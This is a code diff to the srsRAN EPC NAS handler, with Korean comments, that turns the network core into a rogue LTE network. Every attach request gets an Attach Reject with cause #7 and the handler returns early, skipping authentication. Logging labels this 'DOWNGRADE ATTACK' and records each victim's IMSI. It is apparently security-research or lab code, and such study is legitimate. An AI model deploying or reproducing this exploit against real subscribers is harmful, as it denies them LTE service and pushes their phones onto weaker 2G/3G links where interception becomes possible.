@@ -176,6 +176,33 @@ bool nas::handle_attach_request(uint32_t                enb_ue_s1ap_id,
                   pdn_con_req.esm_info_transfer_flag_present ? "true" : "false");
 
   // Get NAS Context if UE is known
+ 
+  
+  //attach reject TEST
+  // 임시 객체 생성
+  nas nas_tmp(args, itf);
+  nas_tmp.m_ecm_ctx.enb_ue_s1ap_id = enb_ue_s1ap_id;
+  nas_tmp.m_ecm_ctx.mme_ue_s1ap_id = s1ap->get_next_mme_ue_s1ap_id();
+
+  // 버퍼 할당
+  srsran::unique_byte_buffer_t nas_tx = srsran::make_byte_buffer();
+  if (nas_tx != nullptr) {
+    nas_tmp.pack_attach_reject(nas_tx.get(), LIBLTE_MME_EMM_CAUSE_EPS_SERVICES_NOT_ALLOWED);
+    
+  
+    s1ap->send_downlink_nas_transport(enb_ue_s1ap_id, nas_tmp.m_ecm_ctx.mme_ue_s1ap_id, nas_tx.get(), *enb_sri);
+    
+
+    srsran::console("DOWNGRADE ATTACK TRIGGERED: Sent Attach Reject (Cause #7) to IMSI %015" PRIu64 "\n\n", imsi);
+    nas_logger.warning("DOWNGRADE ATTACK: Sent Attach Reject (Cause #7) to IMSI %015" PRIu64 "", imsi);
+  }
+  
+  // 무조건 여기서 함수를 종료해 뒤쪽 인증 skip
+  return true; 
+  // =================================================================
+
+  // Get NAS Context if UE is known
+
   nas* nas_ctx = s1ap->find_nas_ctx_from_imsi(imsi);
   if (nas_ctx == NULL) {
     // Get attach type from attach request
@@ -1714,6 +1741,27 @@ bool nas::pack_service_reject(srsran::byte_buffer_t* nas_buffer, uint8_t emm_cau
   }
   return true;
 }
+bool nas::pack_attach_reject(srsran::byte_buffer_t* nas_buffer, uint8_t emm_cause)
+{
+  LIBLTE_MME_ATTACH_REJECT_MSG_STRUCT attach_rej = {};
+
+  attach_rej.emm_cause           = emm_cause;
+  attach_rej.esm_msg_present     = false;
+  attach_rej.t3446_value_present = false;
+  attach_rej.t3446_value         = 0;
+
+  LIBLTE_ERROR_ENUM err =
+      liblte_mme_pack_attach_reject_msg(&attach_rej, (LIBLTE_BYTE_MSG_STRUCT*)nas_buffer);
+
+  if (err != LIBLTE_SUCCESS) {
+    m_logger.error("Error packing Attach Reject");
+    srsran::console("Error packing Attach Reject\n");
+    return false;
+  }
+
+  return true;
+}
+
 
 bool nas::pack_tracking_area_update_reject(srsran::byte_buffer_t* nas_buffer, uint8_t emm_cause)
 {
